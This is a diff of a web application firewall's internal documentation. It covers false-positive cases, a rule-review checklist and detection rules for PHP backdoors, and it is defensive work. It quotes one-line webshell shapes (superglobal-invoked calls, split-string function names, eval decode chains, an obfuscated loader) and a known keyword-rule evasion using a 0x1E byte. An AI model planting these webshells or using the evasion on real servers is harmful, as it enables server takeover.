-   ahead of the proxy vhost would send `cpanel.example.com` to its docroot.
+   ahead of the proxy vhost sends `cpanel.example.com` to its docroot.
+
+**Lesson:** a pass-through keyed on Host must prove the Host reaches the
+trusted backend, on this node, before it trusts the path.
 
 ### FP case 12 — `WAF_HEADER_VULN:HEADER_IF_WEBDAV` (603) on WebDAV sync clients
 
-**Shape:** earth, 2026-09-23 → 29, `cloud.nexon.gr` (Nextcloud). The
-Nextcloud desktop client (`mirall/34.0.4`) deleting synced files sends
-`DELETE /remote.php/dav/files/<user>/<file>` with an `If:` header, the RFC
-4918 conditional (an ETag or lock-token list). Rule 603 flagged the mere
-presence of `If:` as CVE-2017-7269 and pushed a `challenge_v2`. A sync client
-cannot solve a challenge, so the delete failed. The pushed decision is per IP,
-so any request from that IP to a site on the node was also challenged unless
-it already held a clearance cookie for that site. That lasted until ten
-minutes after the client's last retry (`default_ttl_sec = 600`; each retry
-re-pushed after `push_cooldown_sec`). Over 150 h those deletes were the
-**only** 603 hits on the fleet: 16 hits, all this client, and no attack.
+**Shape:** the Nextcloud desktop client deleting synced files:
+`DELETE /remote.php/dav/files/<user>/<file>` with an RFC 4918 `If:` header.
+603 read any `If:` as CVE-2017-7269 and pushed a `challenge_v2`; the delete
+failed, and because the decision is per IP, every uncleared request from
+that IP to any site on the node was challenged until 10 min after the last
+retry. Over 150 h these were the **only** 603 hits on the fleet (16, no
+attack).
 
-**Root cause:** `detect_header_vulns` treated `If:` and `Lock-Token:` as
-attack indicators. Both are ordinary WebDAV headers. Nextcloud, ownCloud,
-Office, the Windows mini-redirector, macOS Finder and davfs2 send them on
-DELETE / PUT / MOVE / UNLOCK. The CVE they stood for is an IIS 6.0
-`ScStoragePathFromUrl` overflow, and no node runs IIS.
+**Why it tripped:** `If:` and `Lock-Token:` are ordinary WebDAV headers
+(Nextcloud, ownCloud, Office, the Windows mini-redirector, Finder, davfs2).
+The CVE is an IIS 6.0 overflow, and no node runs IIS.
 
-**Fix (2026-09-29):** the `If:` and `Lock-Token:` checks (tags
-`HEADER_IF_WEBDAV`, `HEADER_LOCK_TOKEN`) were removed. The alternative was a
-narrowed check keyed on the exploit's shape (a long tagged-list `<http…` with a
-non-ASCII payload). It was rejected: the signature would be written from
-memory rather than the public PoC, and it would guard a server type we don't
-have. Rule 603 keeps httpoxy (`Proxy:`, which no browser or WebDAV client
-sends) and CVE-2025-24813 (Tomcat partial `PUT …/session` + `Content-Range`;
-it keys on that path, so it can only catch a WebDAV partial PUT of a file
-literally named `session`). Apache's own `If:` bug (mod_dav,
-CVE-2006-20001, fixed upstream in httpd 2.4.55) is not a reason to keep the
-presence check: an httpd update fixes it, and the check also blocks every
-WebDAV client.
-Test: `scripts/tests/cfm_waf_header_vulns_test.lua` (rule 603 alone, plus the
-live DELETE under the shipped defaults).
+**Fix:** the `If:` / `Lock-Token:` checks (`HEADER_IF_WEBDAV`,
+`HEADER_LOCK_TOKEN`) were removed. A narrowed exploit-shape check was
+rejected: written from memory, not the PoC, for a server we don't run. 603
+keeps httpoxy (`Proxy:`) and CVE-2025-24813 (Tomcat partial
+`PUT …/session` + `Content-Range`). Apache mod_dav's `If:` bug
+(CVE-2006-20001) is fixed by an httpd update, not by blocking every WebDAV
+client. Test: `scripts/tests/cfm_waf_header_vulns_test.lua`.
+
+**Lesson:** a header's mere presence is a signal only if no legitimate client
+sends it, and a CVE rule must target software the fleet runs.
 
 ### FP case 13 — `WAF_CTRL_CHARS` (601) on Socket.IO long-polling
 
-**Shape:** speedhost, 2026-11-18, `crm-staging.creatures.gr`. A browser
-(Chrome, a Greek residential IP) sent `POST /socket.io/?EIO=4&transport=polling`
-with a `text/plain` body. Engine.IO v4, the transport under Socket.IO 3+, joins
-the packets of one polling POST with `0x1E` (the record separator), and 601
-reads any byte in `0x0E-0x1F` as a control-character payload. It pushed a
-`challenge_v2`, which an XHR cannot solve, so the app's connection broke. It
-was the only such hit in seven days on the 8 edge nodes: a client upgrades to
-websocket and polls only before that, or when websocket is blocked, so the
-batched POST is rare, but every Socket.IO app can send it.
+**Shape:** a browser sending `POST /socket.io/?EIO=4&transport=polling` with a
+`text/plain` body. Engine.IO v4 joins the packets of one polling POST with
+`0x1E`; 601 read any byte in `0x0E-0x1F` as a payload and pushed a
+`challenge_v2`, which an XHR cannot solve. Rare (a client polls only before
+upgrading to websocket, or when websocket is blocked), but every Socket.IO
+app can send it.
 
-**Fix (2026-11-18):** `0x1E` left 601's body scan. It is framing in more
-than Socket.IO: Engine.IO v4 under any mount path (Socket.IO's `path`
-option), ASP.NET SignalR's JSON protocol (every message ends with it, the
-handshake POSTed over long-polling / SSE included) and RFC 7464 json-seq. A
-carve-out keyed on `/socket.io` + `EIO=4` + `transport=polling` was the first
-version; review rejected it, because it missed those and a custom path. None
-of these protocols puts `0x1E` in the query, so the query leg keeps the full
-byte set. Every other control byte still counts. The query leg reads the raw
-query: a percent-encoded control byte (`%01`) is not decoded by 601, by
-decision (below).
-
-**Not decoding `%01` in the query (measured 2026-11-18):** the edge access
-logs of the 8 edge nodes, 11-18 Nov, about 240 million requests, were
-searched for a query carrying an encoded byte decoding would make a 601 hit
-(`%01`-`%08`, `%0B`, `%0C`, `%0E`-`%1F`). Six matched, none an attack, so
-decoding would have added six challenges and caught nothing:
-- orion, `cnm-topography.gr` (5): GPTBot following a broken opensearch link
-  the site's own Joomla prints, `?format=opensearch&id=114:%2026-%11-%10-` (a
-  date written with `%` before each part);
-- earth (1): a logged-in user in cPanel File Manager (`json-api` `listfiles`)
-  opening a folder named with a PNG header's bytes (`%0d%0a%1a%0a`).
-
-So the query leg stays raw. The count leaves out what the logs do not hold:
-request bodies (a urlencoded POST body is not decoded by 601 either) and the
-requests nginx itself refuses (`access.bad_request.log`). Re-measure before
-changing it.
-
-**Known limit:** Python's `str.split()` and Java's `Character.isWhitespace()`
-treat `0x1C-0x1F` as whitespace. A body value joined with `0x1E`
-(`union\x1eselect`) passes the keyword-adjacency rules (301), and 601 no
-longer challenges it in a body. It matters only to a Python / Java app that
-tokenises input that way: MySQL, PostgreSQL and the shell do not read `0x1E`
-as whitespace, and `0x1C`, `0x1D` and `0x1F` still trip 601.
+**Fix:** `0x1E` left 601's **body** scan. It is framing beyond Socket.IO:
+Engine.IO v4 under any mount path, ASP.NET SignalR's JSON protocol (handshake
+over long-polling / SSE included), RFC 7464 json-seq. A carve-out keyed on
+`/socket.io` + `EIO=4` + `transport=polling` was rejected in review: it
+missed those and custom paths. The query leg keeps the full byte set (none
+of these protocols put `0x1E` there); every other control byte still counts.
 Test: `scripts/tests/cfm_waf_ctrl_chars_record_separator_test.lua`.
 
-**Rest of 601 on the fleet** (same 7 days, 56 hits): 8 were the Optimization
-Detective beacon under a language prefix (`/en/wp-json/…`), fixed on
-2026-11-17. The other 47 came from datacenter addresses: `POST /` with
-`text/css` / `text/csv` / `text/xml` bodies from `Go-http-client`, and
-`POST /inproxy-broker` to Psiphon hosts (`*.psiphon3.com`, `*.b-cdn.net`)
-fronted at our IPs. None was a visitor's request.
+**Decided: the query leg stays raw (no `%01` decoding).** Measured over the
+8 edge nodes' access logs, 11-18 Nov, ~240 M requests: six queries carried an
+encoded byte decoding would turn into a hit (`%01`-`%08`, `%0B`, `%0C`,
+`%0E`-`%1F`), none an attack (GPTBot on a site's broken opensearch link; a
+cPanel File Manager folder named with PNG header bytes). Decoding would add
+challenges and catch nothing. The count misses request bodies and requests
+nginx refuses itself (`access.bad_request.log`): re-measure before changing
+it.
+
+**Known limit:** Python's `str.split()` and Java's
+`Character.isWhitespace()` treat `0x1C-0x1F` as whitespace, so
+`union\x1eselect` in a body passes 301 and no longer trips 601. It matters
+only to a Python / Java app tokenising that way; MySQL, PostgreSQL and the
+shell do not, and `0x1C`, `0x1D`, `0x1F` still trip 601.
+
+The rest of 601 in the same week (56 hits): 8 were the Optimization
+Detective beacon under a language prefix (`/en/wp-json/…`, fixed), 47 came
+from datacenter addresses (`Go-http-client` `POST /` with text bodies, Psiphon
+`/inproxy-broker`). None was a visitor.
+
+**Lesson:** a byte that is framing in a common protocol cannot be a payload
+signal in a body; carve out the byte, not one app's path.
 
 ### Structural anti-patterns to check during rule review
 
-A short list. Every one of these surfaced as a real FP above; reading
-new detector PRs with these in hand catches most of the next batch
-before they ship.
+Every one of these surfaced as a real FP above. Read new detector PRs with
+them in hand.
 
-| Anti-pattern | What to check | Affected case above |
+| Anti-pattern | What to check | Case |
 |---|---|---|
-| Plain-substring match on a token that's a common English word fragment (`onerror`, `onload`, `eval`, `system`) | Anchor on `%f[%w]` frontier or equivalent | XSS (#2) |
-| Length-based rule on the URI path | Does any CMS template inject `data:` URIs, `srcset=` strings, or unquoted `url(…)` that a crawler might follow? | LONG_PATH (#1) |
-| Generic "this isn't UTF-8" validator | Does the rule actually fire only on encoding-bypass primitives (overlong/surrogate/out-of-range), or does it flag all non-UTF-8? | BAD_UTF8 (#3) |
-| Protocol-scheme scanner over args/body | What schemes are legitimately stored as config by top WP / Joomla / Magento plugins? | SSRF_FTP (#4) |
-| Body-content scanner (code shapes, PHP openers, SQL keywords) | What admin tooling writes this content shape legitimately? Does the rule belong off `/wp-admin/` paths? | PHP_OPENER (#5) |
-| Per-byte walker on body | Does it assume the body is text? Multipart file uploads carry arbitrary binary. | BAD_UTF8 (#3) |
-| Rule that depends on a specific buffer composition (e.g. `args + "&" + body`) | Tests that exercise the rule should pass complete, self-contained inputs — not rely on implementation details of how the WAF concatenates args and body | BAD_UTF8 (#3, test 76) |
+| Plain-substring match on a common word fragment (`onerror`, `onload`, `eval`, `system`) | Anchor on `%f[%w]` or equivalent | XSS (#2) |
+| Length-based rule on the URI path | Does a CMS template inject `data:` URIs, `srcset=` strings or unquoted `url(…)` a crawler follows? | LONG_PATH (#1) |
+| Generic "this isn't UTF-8" validator | Does it fire only on bypass primitives (overlong / surrogate / out-of-range), or on all non-UTF-8? | BAD_UTF8 (#3) |
+| Protocol-scheme scanner over args/body | Which schemes do top WP / Joomla / Magento plugins store as config? | SSRF_FTP (#4) |
+| Body-content scanner (code shapes, PHP openers, SQL keywords) | Which admin tooling writes this shape? Does the rule belong off `/wp-admin/`? | PHP_OPENER (#5) |
+| Per-byte walker on body | Does it assume text? Multipart uploads carry arbitrary binary. | BAD_UTF8 (#3) |
+| Rule that depends on buffer composition (e.g. `args + "&" + body`) | Tests pass complete, self-contained inputs, not rely on how the WAF concatenates args and body | BAD_UTF8 (#3, test 76) |
 
 ### Pre-merge checklist for a new detector
 
-1. **Run on a captured production log.** Replay the rule's Lua logic
-   against `cfm.waf.log` (or `access.log` if pre-WAF). Expect zero
-   FPs at logonly, in a >24h window, before promoting.
-2. **Check `/wp-admin/` and `/wp-json/` traffic specifically.** Almost
-   all of the FPs above arrived via WP admin / REST endpoints. Carve
-   out at the call site (cleanest) or per-vhost exclusion (operator-
-   driven) rather than tightening the detector itself.
-3. **Check bare-IP `host` traffic separately.** `WAF_IP_HOST` already
-   catches it, but rules that also fire on the same requests can
-   double-challenge legitimate research scanners (Palo Alto Cortex
-   Xpanse, Censys, etc.) at well-known IP-only endpoints.
-4. **Check Facebook + Instagram traffic.** AS32934 has its own ad
-   crawler shapes (`facebookexternalhit`, in-app browser UAs) that hit
-   ad landing pages with URLs sometimes mangled by FB's link-preview
-   infrastructure.
-5. **For length/encoding/protocol-scheme rules, write the
-   anti-pattern test before the positive test.** Pick the most
-   realistic legitimate input that could trip the rule (a multipart
-   POST, a `data:` URI in path, a `;base64,` body, a legacy ISO-8859-x
-   form post) and assert the rule does not fire. Then write the
+1. **Run on a captured production log.** Replay the rule against
+   `cfm.waf.log` (or `access.log` if pre-WAF). Expect zero FPs at logonly
+   over more than 24 h before promoting.
+2. **Check `/wp-admin/` and `/wp-json/` traffic specifically.** Almost every
+   FP above came through WP admin / REST. Carve out at the call site
+   (cleanest) or with a per-vhost exclusion (operator-driven) rather than
+   tightening the detector.
+3. **Check bare-IP `host` traffic separately.** `WAF_IP_HOST` already catches
+   it; another rule firing on the same requests double-challenges research
+   scanners (Palo Alto Cortex Xpanse, Censys) at IP-only endpoints.
+4. **Check Facebook + Instagram traffic.** AS32934 has its own crawler shapes
+   (`facebookexternalhit`, in-app browser UAs), with URLs sometimes mangled by
+   its link-preview infrastructure.
+5. **For length / encoding / protocol-scheme rules, write the anti-pattern
+   test first.** Take the most realistic legitimate input that could trip the
+   rule (a multipart POST, a `data:` URI in the path, a `;base64,` body, a
+   legacy ISO-8859-x form post) and assert it does not fire. Then the
    positive case.
 6. **Start at `logonly`.** Promote only after `cfm webtop waf hit-rates`
-   shows `ok_to_promote` (rate < 0.01%) over a representative window
-   and you've grep'd the JSON log for any host whose hit-count is
-   disproportionate.
+   shows `ok_to_promote` (rate < 0.01%) over a representative window and the
+   JSON log shows no host with a disproportionate hit count.
 
 ---
 
@@ -1106,926 +754,572 @@ The `rule_id` field returned by the bridge's `/nginx/decision` endpoint is a **s
 
 ## Backdoor / obfuscation family (430-438)
 
-Reason family **`WAF_BACKDOOR`** (added to `_M.WAF_HIGH_RISK_REASONS` so post-clearance challenges still escalate to block when these rules are promoted past `logonly`). Source workload for the initial set: a 2026-05-19 captured PHP webshell deployed as `wp-content/themes/bridge/includes/radio.php` — char-pool-obfuscated PDF-polyglot loader.
-
-The rules are split deliberately so each catches a different *class* of evasion. The captured radio.php sample trips 431 + 432 + 433 together (severity aggregation picks the strongest action; all three rule IDs appear in `hits`).
+Reason family **`WAF_BACKDOOR`**, in `_M.WAF_HIGH_RISK_REASONS`: a challenge
+for a cleared client converts to block. The first set came from a captured
+webshell (2026-05-19, `wp-content/themes/bridge/includes/radio.php`, a
+char-pool-obfuscated PDF-polyglot loader). Each rule catches a different class
+of evasion. Modes: 430-436 `logonly`, 437 `challenge_v2`, 438 `block` (armed,
+6 h ban), 440 `block` with its ban held. Per-vhost exclusions apply as usual
+(`cfm webtop waf exclude add /path --rule 430`).
 
 ### Rule 415 — `rule_upload_content_deep`
 
-Rule 402's PHP / JSP openers (`<?php`, a short-echo `<?=` with a PHP
-expression after it, `<jsp:`) in the uploaded **files** past 402's window (the
-body's first 2 KB): a webshell after 2 KB of image data, or in a second file.
-Each file part is read from its start, so an opener inside the 2 KB with its
-code padded past it is seen whole. 415 also reads the two-byte `<?` short open
-tag (whitespace, `@` / `\` / comments, then a variable, `echo` / `print` / …
-or a call `name(`; glued to the tag, `<?system(` / `<?$x=`, a little
-tighter, as two random bytes after `<?` must not read as code), which 402
-does not: 402 scans text fields too, and a
-ticket quoting `<? echo $title; ?>` is no webshell. Expect some logonly noise
-from text attachments that quote PHP (`<? if(…)`): review it at promotion.
-Only file parts (a `filename=`, as PHP registers them) are read, to the
-multipart body budget (16 KB), and only for the openers, not 402's
-superglobal words (since 2026-10-09 402 reads those in file parts only, and only next to a PHP opener in the same part (any `<?` but an XML-style PI PHP cannot parse — `<?xml version=`, `<?xml-stylesheet`, `<?xpacket`, `<?mso-application` followed by an attribute; `<?xml:` is a goto label and counts — or `<script language="php">`), so `$_POST` in ticket / forum text or in an attached `error.log` is no longer a 402 FP; `<?php` / `<?=` alone still block anywhere in the window). Added
-2026-10-09 at `logonly`: those bytes were never scanned before, and a text
-attachment quoting PHP would be a 6 h ban at block. Promote it in
-`cfm_waf_config.lua` (`rule_upload_content_deep = "block"`) after a clean
-burn-in (`node_call waf_rule_detail` / the `cfm.waf.log` hits for 415); the
-family (`WAF_UPLOAD_CONTENT`) is already autoblock-armed through 402, so a
-promotion arms 415 too. Exempt on the same legit-archive endpoints as 402.
+Family `WAF_UPLOAD_CONTENT`, `logonly`. 402's PHP / JSP openers (`<?php`, `<?=`
+with a PHP expression after it, `<jsp:`) in uploaded **file** parts (a
+`filename=`) past 402's 2 KB window: a webshell after 2 KB of image data, or
+in a second file. Each part is read from its start, to the multipart budget
+(16 KB). It also reads the `<?` short tag when code follows, which 402 does
+not: 402 scans text fields too, and a ticket quoting `<? echo $title; ?>` is
+no webshell. The tag names the file's extension (`UPLOAD_PHP_TAG_DEEP:<ext>`).
+
+402 reads superglobal words only in file parts and only next to a PHP opener
+in the same part (any `<?` but an XML-style PI PHP cannot parse:
+`<?xml version=`, `<?xml-stylesheet`, `<?xpacket`, `<?mso-application` plus an
+attribute; `<?xml:` is a goto label and counts; or `<script
+language="php">`). So `$_POST` in a ticket or an attached `error.log` is no
+402 FP; `<?php` / `<?=` alone still block anywhere in the window.
+
+**Why logonly:** these bytes were never scanned before, and a text attachment
+quoting PHP would be a 6 h ban at block. 14-day fleet read (2026-11-17): 2
+hits, both media-library uploads by Greek admins. Promote with
+`rule_upload_content_deep = "block"` after a clean burn-in; the family is armed
+through 402, so the promotion arms 415 too. Exempt on the same legit-archive
+endpoints as 402.
 
 ### Rule 430 — `rule_htaccess_poisoning`
 
-**Catches:** `.htaccess` / `.user.ini` uploads that turn benign files into PHP executors.
+**Matches** `.htaccess` / `.user.ini` uploads that flip a handler to PHP (the
+escape from a "no .php upload" filter: upload `.htaccess`, then `shell.jpg`):
+handler directives anchored on `x-httpd-php` (so font/media `AddType` lines do
+not match), `auto_prepend_file` / `auto_append_file` (`php_value` or
+`.user.ini` form), `Options +ExecCGI`. Tags `HTACCESS_{ADDTYPE,SETHANDLER,
+ADDHANDLER}_PHP`, `HTACCESS_AUTO_{PREPEND,APPEND}`,
+`USER_INI_AUTO_{PREPEND,APPEND}`, `HTACCESS_EXEC_CGI`.
 
-**Why it matters:** the standard escape from a successful "no .php upload" filter is to upload a `.htaccess` (or `.user.ini`) that flips the handler for `.jpg`/`.gif`/`.png` to PHP, then upload a `shell.jpg` that's now executable. CFM had zero coverage for this before.
+**Stays `logonly`:** on shared hosting a hand-written `AddType
+application/x-httpd-php .php` is legitimate, and the three Apache-directive
+branches are not prose-gated like the `.user.ini` one, so a ticket discussing
+the directive or a File Manager `.htaccess` edit matches. It is not gated by
+`legit_archive_upload` either. Promotion waits for a prose gate (a
+directive-shaped context, not the bare token) on those branches.
 
-**How:** body substring scan for handler-flip primitives anchored on `x-httpd-php` to avoid colliding with legit AddType for fonts / media. Also flags `auto_prepend_file` / `auto_append_file` (Apache `php_value` or `.user.ini` `key = value` forms) and `Options +ExecCGI`.
+### Rules 431-436 — PHP obfuscation shapes
 
-**Tags:** `HTACCESS_ADDTYPE_PHP`, `HTACCESS_SETHANDLER_PHP`, `HTACCESS_ADDHANDLER_PHP`, `HTACCESS_AUTO_PREPEND`, `HTACCESS_AUTO_APPEND`, `USER_INI_AUTO_PREPEND`, `USER_INI_AUTO_APPEND`, `HTACCESS_EXEC_CGI`.
+All `logonly`, all body scans.
 
-**FP notes:** legitimate plugin `.htaccess` content (`RewriteRule`, `ExpiresByType`, `AddType image/svg+xml`) does not contain the handler-flip anchors. **Caveat for shared hosting:** `AddType application/x-httpd-php .php` is also a *legitimate* hand-written directive an admin/host uses to force PHP in a directory, and the three Apache-directive branches (`addtype`/`sethandler`/`addhandler`) are **not** prose-gated the way the `.user.ini` branch is — so a forum/ticket/CMS POST that merely *discusses* the directive, or a File-Manager `.htaccess` edit, matches. Unlike rule 432, this rule is **not** gated by `legit_archive_upload` either.
+| Rule | Matches | Tag | Why no legit code matches |
+|---|---|---|---|
+| 431 `rule_php_char_pool_obfuscation` | 3+ dot-concatenated indexed reads of the **same** variable (`$p[61].$p[7].$p[34]`, building `gzinflate`): FOPO / PHP-Obfuscator / Code-Eater output, where the function name never appears as a substring | `CHAR_POOL_BUILDER` | legit PHP reads arrays in a loop or with `implode` |
+| 432 `rule_php_polyglot_full_body` | first 16 bytes are file magic (`%PDF-`, JPEG, PNG, GIF87a/89a, `PK\x03\x04`, `BM`, `RIFF`) and a PHP/JSP/script opener anywhere in the budget, not just 412's first 64 bytes | `POLYGLOT_DEEP_<PDF\|JPEG\|PNG\|GIF\|ZIP\|BMP\|RIFF>` | binary files do not contain `<?php` |
+| 433 `rule_php_eval_loader_b64` | terminal `eval` / `assert` / `call_user_func[_array]` whose first argument is a variable-fed call (`eval($a($b("…")))`) plus a quoted literal ≥ 200 chars, ≥ 90 % base64 alphabet: the loader's transport, whatever built the names | `EVAL_LOADER_B64` | a literal-name `eval(base64_decode(…))` does not match (other rules cover it) |
+| 434 `rule_php_superglobal_callable` | a superglobal invoked as the callable: `$_GET[…](`, `$_POST[…](`, `$_REQUEST[…](`, `$_COOKIE[…](`, `$_SERVER[…HTTP_…](` (the dominant post-2020 backdoor; no function is named) | `SG_<GET\|POST\|REQUEST\|COOKIE\|SERVER_HTTP>_CALL` | legit code uses superglobals as values or keys, never followed by `(` |
+| 435 `rule_php_concat_funcname_eval` | `$a = "sys"."tem"; $a(…)`: pieces of 1-6 `[a-zA-Z_]` chars, the variable later called, not after `->` | `CONCAT_FUNCNAME_CALL` | the class excludes path/version concatenations; templates use `$obj->$method()` |
+| 436 `rule_php_decode_chain` | 3 decoder calls (`base64_decode`, `gzinflate`, `gzuncompress`, `gzdecode`, `str_rot13`, `strrev`, `hex2bin`, `convert_uudecode`, `bzdecompress`, `pack`, each followed by `(`) within 300 bytes | `DECODE_CHAIN` | plugins and WP core (`wp-includes/pomo`) use them in separate functions, far apart |
 
-**Tier:** stays at `logonly` (observe-only). Promotion to `challenge` is deferred until the three Apache-directive branches get the same prose-gate (require a directive-shaped context, not the bare token) that the `.user.ini` branch already has; until then the shared-hosting FP surface above rules out interrupting.
+431 / 433 cover hidden decoder names, 435 / 436 the literal, hand-rolled
+forms.
 
-### Rule 431 — `rule_php_char_pool_obfuscation`
+**432 and `<?=`.** The 3-byte `<?=` collides with binary about once per ~16 MB
+of image data: it fired 432 and 402 on product photos (the same save
+alternated 200/403). `has_php_short_echo` now requires an expression after it
+(optional `@`, then `$`, a backtick, a quote, `(`, or `name(` whose name may
+hold digits). `<?=1` and the like are not webshell openers.
 
-**Catches:** PHP obfuscator output where function names are assembled by indexing into a random-character pool, e.g.
-
-```php
-$t_Ohw = "8Njlp26zFZ1PYvUsnckDOX5JdhCwMSRafLi0bqeQo4WxtBrTAu3IEm7VHG_K9gy";
-$IDC3B = $t_Ohw[61].$t_Ohw[7].$t_Ohw[34]…;  // builds "gzinflate"
-```
-
-**Why it matters:** every static substring detector — ours, CRS, libinjection — looks for literal `gzinflate` / `base64_decode` / `eval` tokens. Char-pool extraction defeats them by construction: the function name never appears as a substring of the source. This catches the entire FOPO / PHP-Obfuscator / Code-Eater output class.
-
-**How:** Lua pattern with a backreference (`%1`) requiring 3+ indexed accesses against the *same* variable, dot-concatenated:
-
-```
-%$([%w_]+)%[%d+%]%s*%.%s*%$%1%[%d+%]%s*%.%s*%$%1%[%d+%]
-```
-
-**Tag:** `CHAR_POOL_BUILDER`.
-
-**FP notes:** legitimate PHP reads sequential array elements with a loop or `implode`, never with three unrolled `$v[N].$v[N].$v[N]` accesses. The pattern grammar appears in no legit idiom.
-
-### Rule 432 — `rule_php_polyglot_full_body`
-
-**Catches:** uploaded files whose first 16 bytes are image/PDF/ZIP magic but which contain `<?php` (or `<?=`, `<jsp:`, `<% page`, `<script language="php"`) **anywhere** in body — not just within rule 412's first-64-byte window.
-
-**Why it matters:** rule 412 covers the leading-64-bytes polyglot case (which still fires on the captured sample because its `<?php` opener sits at byte 13). The general class is broader: an attacker can pad the magic prefix with arbitrary bytes and slip the PHP opener anywhere — at byte 500, byte 5000. Legit binary files never contain `<?php` at any offset.
-
-**How:**
-1. First 16 bytes match one of: `%PDF-`, `\xff\xd8\xff` (JPEG), `\x89PNG\r\n\x1a\n` (PNG), `GIF87a` / `GIF89a`, `PK\x03\x04` (ZIP/JAR/DOCX), `BM` (BMP), `RIFF` (WebP/WAV).
-2. Body within scan budget contains a PHP/JSP/script opener.
-
-**Tags:** `POLYGLOT_DEEP_PDF`, `POLYGLOT_DEEP_JPEG`, `POLYGLOT_DEEP_PNG`, `POLYGLOT_DEEP_GIF`, `POLYGLOT_DEEP_ZIP`, `POLYGLOT_DEEP_BMP`, `POLYGLOT_DEEP_RIFF`.
-
-**FP notes:** image / PDF / ZIP files do not legitimately contain `<?php` tokens — the magic-byte gate plus the PHP-opener gate together are malware-only. **Caveat (fixed 2026-06-04):** the 5-byte `<?php` opener is binary-safe, but the 3-byte `<?=` short-echo opener (`3C 3F 3D`) collides with high-entropy binary roughly once per ~16 MB of image data — it fired `POLYGLOT_DEEP_*` (and rule 402 `UPLOAD_PHP_TAG`) on innocent WebP/JPEG product-photo uploads (e-vafeiadis.gr: the same product save alternated 200/403 across retries, proving a content-dependent collision). `<?=` is now matched only when followed by an actual PHP expression — an optional `@`, then a variable/superglobal (`$`), backtick exec, quoted string, `(`, or a function call `name(` whose name may contain digits (`base64_decode(`, `md5(`, `str_rot13(`) — via `has_php_short_echo`. This keeps the input-driven short-tag webshell shapes (including superglobal-free ones like `<?=base64_decode(file_get_contents('php://input'))`) while removing the binary-collision FP. The remaining unmatched forms (e.g. a numeric echo `<?=1`) are not exploitable webshell openers.
-
-**Tier:** stays at `logonly`. It was briefly promoted to `challenge`, but `WAF_BACKDOOR` is a high-risk reason, so for a client holding a valid clearance cookie the challenge is converted to a **block** (`post_clearance_action`) — and because the `BACKDOOR` family is autoblock-armed (`detectors.conf`), that converted block can earn a **6h nft ban** of a logged-in customer who uploads e.g. a PDF containing the literal string `<?php` via a raw-body endpoint. (Multipart uploads never trip 432 — the body starts with the boundary, not the file magic — so the risk is raw-body uploads.) Promote only after post-clearance-converted hits are excluded from the Phase-1 autoblock feed.
-
-### Rule 433 — `rule_php_eval_loader_b64`
-
-**Catches:** the obfuscator-output loader shape, *independent* of which obfuscator built the function-name strings:
-
-```php
-eval($a($b("BASE64_PAYLOAD…")));    // variable-fed call chain + large base64 literal
-assert($d("LONG_BASE64_STRING"));
-call_user_func($f, $payload);
-```
-
-**Why it matters:** we don't peer into the encoded payload (could be gzdeflate-of-gzdeflate, str_rot13, XOR, anything). We recognise the *transport*: a terminal `eval` / `assert` / `call_user_func` / `call_user_func_array` whose first argument is a variable-fed call (`$<name>(`), with a base64-shaped string ≥ 200 chars in the same body. Resilient across obfuscator versions — works whether the decoders are built by char-pool, string-concat, string-reverse, or any other mechanism.
-
-**How:**
-1. Body contains `eval(` / `assert(` / `call_user_func(` / `call_user_func_array(` followed (with optional `@` and whitespace) by `$<varname>(` — the variable-fed shape.
-2. Body contains a quoted literal whose inner content is ≥ 200 chars and ≥ 90% base64-alphabet (`A-Za-z0-9+/=`).
-
-**Tag:** `EVAL_LOADER_B64`.
-
-**FP notes:** `eval(base64_decode("..."))` with a *literal* function name does not match — this rule targets the variable-fed shape that is the hallmark of obfuscator output. A simple `eval(base64_decode(...))` without variable indirection is the older, less-evasive form already caught by other rules.
-
-### Rule 434 — `rule_php_superglobal_callable`
-
-**Catches:** the modern minimalist webshell that invokes a superglobal as a callable, e.g.
-
-```php
-<?php $_GET['c']($_GET['p']);
-<?php $_REQUEST['x']();
-<?php $_SERVER['HTTP_X_CMD']();   // magic-header-triggered shell
-```
-
-**Why it matters:** the dangerous primitive is **invoked** via the superglobal, not named — so every `eval(`/`system(`/`exec(` substring scanner misses it. This is the dominant shape for backdoors written post-2020 because it defeats CRS / Coraza / our own 404 scoring at once.
-
-**How:** body substring scan for `$_GET[…](`, `$_POST[…](`, `$_REQUEST[…](`, `$_COOKIE[…](`, or `$_SERVER[…HTTP_…](` — a superglobal subscript immediately followed by the PHP function-call grammar `(`.
-
-**Tags:** `SG_GET_CALL`, `SG_POST_CALL`, `SG_REQUEST_CALL`, `SG_COOKIE_CALL`, `SG_SERVER_HTTP_CALL`.
-
-**FP notes:** legitimate code reads superglobals as values (`echo $_GET['name']`) or uses them as array keys (`$config[$_GET['key']]`), never as the callable itself. The pattern requires the `(` immediately after the subscript — array-key use disqualifies because the next char is `]`, not `(`.
-
-### Rule 435 — `rule_php_concat_funcname_eval`
-
-**Catches:** the function-name version of canary 421's split-string trick — assemble a dangerous function name from short literal pieces, then invoke:
-
-```php
-<?php $a = "sys" . "tem"; $a($_GET['c']);
-<?php $f = "ev" . "al";   $f($payload);
-```
-
-**Why it matters:** complementary to 431 (char-pool extraction). 431 catches `$pool[N].$pool[N].$pool[N]…`; 435 catches the simpler `"piece"."piece"` form that older / hand-rolled obfuscators favour. Substring sets looking for `system` / `eval` / `assert` miss both.
-
-**How:** capture `$<varname> = "<piece1>" . "<piece2>"` where:
-- each piece is 1-6 chars of `[a-zA-Z_]` only (alpha+underscore, no digits, no slashes — disqualifies path concats `"/var"."/log"` and version-number assemblies)
-- the same `$<varname>` is then invoked with `(` later in the body
-- the invocation is **not** preceded by `->` (excludes legitimate dynamic method dispatch `$obj->$method()`)
-
-**Tag:** `CONCAT_FUNCNAME_CALL`.
-
-**FP notes:** the tight alpha+underscore character class plus the method-dispatch exclusion handles the common legit shapes. Template engines that build method names this way use `$obj->$method()`, not `$method()` directly.
-
-### Rule 436 — `rule_php_decode_chain`
-
-**Catches:** the classic obfuscator-loader pattern when the decoder names *are* substrings of the source (older obfuscators, hand-rolled droppers):
-
-```php
-eval(gzinflate(base64_decode(strrev($payload))));   // 4 decoders, < 80 chars
-```
-
-**Why it matters:** complementary to rules 431 (char-pool extraction) and 433 (variable-fed eval loader). Those two catch the modern obfuscators that hide the decoder names; 436 catches the older / lazier shape where the names are literal. Together they cover both "named decoders" and "hidden decoders".
-
-**How:** scan body for occurrences of any decoder primitive (followed by `(` to disqualify substring-of-identifier matches):
-
-> `base64_decode`, `gzinflate`, `gzuncompress`, `gzdecode`, `str_rot13`, `strrev`, `hex2bin`, `convert_uudecode`, `bzdecompress`, `pack`
-
